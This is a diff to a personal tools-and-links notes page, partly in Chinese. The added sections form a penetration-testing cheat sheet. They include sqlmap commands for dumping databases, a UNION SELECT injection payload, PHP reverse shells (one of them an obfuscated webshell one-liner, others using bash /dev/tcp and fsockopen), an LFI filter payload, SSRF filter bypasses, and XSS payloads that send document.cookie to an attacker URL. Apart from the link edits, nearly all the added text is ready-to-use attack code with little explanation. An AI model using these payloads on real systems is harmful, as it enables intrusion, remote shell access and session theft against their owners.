@@ -23,7 +23,7 @@
 * [Android 螢幕投影](https://www.google.com/search?q=apowermirror&oq=apowermirror&aqs=chrome..69i57j0l7.5587j0j7&sourceid=chrome&ie=UTF-8)
 * [Bash Command Search](https://ss64.com/)
 * [7z-CLI-用法](https://www.cnblogs.com/sparkdev/p/5598062.html)
-    ```bash=
+    ```bash
     7z.exe a <target> <source: 只能用相對路徑>
     ```
 * [PCHunter Tool](https://www.bleepingcomputer.com/download/pc-hunter/)
@@ -53,6 +53,88 @@
 
 ## Reverse Shell Upload File
 
-- https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet
+* https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet
 
 
+## SQLMAP
+
+### download source
+
+```bash
+git clone https://github.com/sqlmapproject/sqlmap
+```
+
+### 起手式
+
+```python
+python sqlmap.py -o --random-a -u "url" --tamper base64encode -D <DB> -T <TABLE> --dump
+```
+
+### 各種參數
+
+- https://xz.aliyun.com/t/3010
+
+```
+--dbs
+--schema
+--batch
+-D
+-T
+--data="<post 參數>"
+--random-agent
+--tamper base64encode
+-technique=U,B --union-cols=number --dbms-mysql
+```
+### app.any.run
+
+* https://app.any.run/
+
+### 手打
+
+```
+union select 1,2,group_concat(schema_name),4 from information_schema.schemata#
+```
+
+## PHP
+
+### reverse shell
+
+#### linux
+```php
+<?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
+```
+
+```php
+<?php
+exec("/bin/bash -c 'bash -i > /dev/tcp/<ip>/<port> 0>&1'");
+?>
+```
+
+```php
+php -r '$sock=fsockopen(<ip>,<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+### LFI
+
+```
+/?path=php://filter/convert.base64-encode/resource=index.php
+```
+
+### SSRF繞過
+- `127.0.0.0/8`
+- redirect
+- `http://@127.0.0.1`
+
+```
+gethostbyname('127.0.0.1') == '127.0.0.1'
+gethostbyname('localhost') == '127.0.0.1'
+gethostbyname('localtest.me') == '127.0.0.1'
+gethostbyname('@127.0.0.1') == '@127.0.0.1'
+```
+
+## XSS
+
+```html
+<script>var i=new Image;i.src="<url>/?"+document.cookie;</script>
+<svg/onload="document.location='<url>/?'+document.cookie">
+```
